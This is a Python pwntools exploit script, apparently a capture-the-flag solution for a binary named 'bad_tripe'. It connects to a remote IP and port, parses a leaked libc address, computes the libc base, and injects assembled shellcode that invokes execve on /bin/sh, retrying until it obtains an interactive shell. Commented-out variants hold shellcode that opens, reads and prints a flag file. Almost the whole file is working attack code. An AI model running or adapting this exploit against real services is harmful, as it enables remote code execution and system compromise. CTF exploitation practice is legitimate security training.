#!/usr/bin/python3

from pwn import *

exe = ELF('./bad_tripe', checksec=False)
libc = ELF('./libc.so.6',checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB(p):
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*exec+71
        c
        ''')
        input()


# if args.REMOTE:
#     p = remote('172.210.129.230',1352)
# else:
#     p = process(exe.path)
    

# sc_local = b'\x48\xBC\x10\x6A\x69\x69\x69\x00\x00\x00\x48\xC7\xC3\x74\x00\x00\x00\x53\x48\xBB\x2F\x66\x6C\x61\x67\x2E\x74\x78\x53\x48\x89\xE7'
# sc_remote = b'\x48\xBC\x10\x6A\x69\x69\x69\x00\x00\x00\x48\xBB\x61\x67\x2E\x74\x78\x74\x00\x00\x53\x48\xBB\x2F\x63\x68\x61\x6C\x2F\x66\x6C\x53\x48\x89\xE7'

# shellcode1 = asm(f"""
#                 mov rcx, {syscall}
#                 xor rsi, rsi
#                 xor rdx, rdx
#                 push 2
#                 pop rax
#                 call rcx
#                 """,arch='amd64')

# shellcode2 = asm(f"""
#                 dec rcx
#                 dec rcx
#                 push 3
#                 pop rdi
#                 mov rsi, 0x6969696b00
#                 mov rdx, 0x80
#                 xor rax, rax
#                 call rcx
#                  """,arch='amd64')

# shellcode3 = asm(f"""
#                 dec rcx
#                 dec rcx
#                 push 1
#                 pop rdi
#                 mov rsi, 0x6969696b00
#                 mov rdx, 0x80
#                 push 1
#                 pop rax
#                 call rcx
#                  """,arch='amd64')
context.terminal = ['foot']
while True:
    p = remote('172.210.129.230',1352)
    # p = process(exe.path)
    # GDB(p)
    p.recvuntil(b'with ')
    leak = int(b"0x7f32"+p.recvuntil(b'\n',drop=True)[2:],16)
    info("leak: " + hex(leak))
    # libc_leak = 00000000 | leak 
    libc_leak = leak
    libc.address = libc_leak - libc.sym.puts
    info("libc leak: " + hex(libc_leak))
    info("libc base: " + hex(libc.address))

    put_got = exe.got.puts
    put_plt = exe.plt.puts
    syscall = libc.address + 0x111709

    pl = asm(f"""
                    mov rsp, 0x6969696a10
                    mov rcx, {syscall}
                    mov rbx, 29400045130965551
                    push rbx

                    mov rdi, rsp
                    xor rsi, rsi
                    xor rdx, rdx
                    mov rax, 0x3b
                    call rcx
             """,arch='amd64')

# payload = sc_remote + shellcode1 + shellcode2 + shellcode3
    payload = pl
    sa(b'>> ',payload)
    try:
        p.sendline(b'echo lmaodark')
        p.recvuntil(b'lmaodark')
        p.interactive()
    except:
        try:
            p.close()
        except:
            pass 
# p.interactive()
